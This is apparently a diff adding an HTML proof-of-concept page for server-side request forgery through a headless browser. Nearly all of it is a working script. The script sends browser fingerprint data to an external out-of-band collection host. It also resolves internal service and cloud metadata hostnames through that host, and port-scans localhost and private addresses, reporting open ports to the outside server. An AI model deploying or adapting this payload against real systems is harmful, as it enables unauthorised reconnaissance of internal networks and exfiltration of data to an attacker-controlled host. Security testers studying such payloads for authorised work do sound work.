@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SSRF + Headless Browser - Full PoC</title>
+</head>
+<body>
+  <h1>SSRF + Headless Browser Impact Test</h1>
+  <p>Probing internal network and cloud metadata...</p>
+
+<script>
+(function() {
+  const exfil = (path, data) => {
+    fetch('http://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun' + path + '?d=' + encodeURIComponent(data));
+  };
+
+  // === [2] DNS Rebinding / Internal Resolution Test ===
+  const internalDnsNames = [
+    'internal-service.local',
+    'internal-api.default.svc.cluster.local',
+    'api.internal',
+    'vault.service.consul',
+    'metadata.google.internal',
+    'host.docker.internal'
+  ];
+
+  internalDnsNames.forEach(name => {
+    let img = new Image();
+    img.src = 'http://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
+  });
+
+  // === [3] Fingerprinting again for full context ===
+  exfil('fingerprint', JSON.stringify({
+    ua: navigator.userAgent,
+    webdriver: navigator.webdriver,
+    plugins: navigator.plugins.length,
+    languages: navigator.languages,
+    screen: { w: screen.width, h: screen.height },
+    platform: navigator.platform,
+    doNotTrack: navigator.doNotTrack,
+    vendor: navigator.vendor
+  }));
+
+  // === [4] Optional: Internal port scan (repeat or extend as needed) ===
+  const ips = ['127.0.0.1', 'localhost', '172.17.0.1', '10.0.0.1'];
+  const ports = [80, 3000, 5000, 8000, 8080, 8443, 2375, 9200, 9222];
+
+  ips.forEach(ip => {
+    ports.forEach(port => {
+      let img = new Image();
+      img.src = `http://${ip}:${port}/favicon.ico`;
+      img.onload = () => exfil('open_port', `${ip}:${port}`);
+      img.onerror = () => {};
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
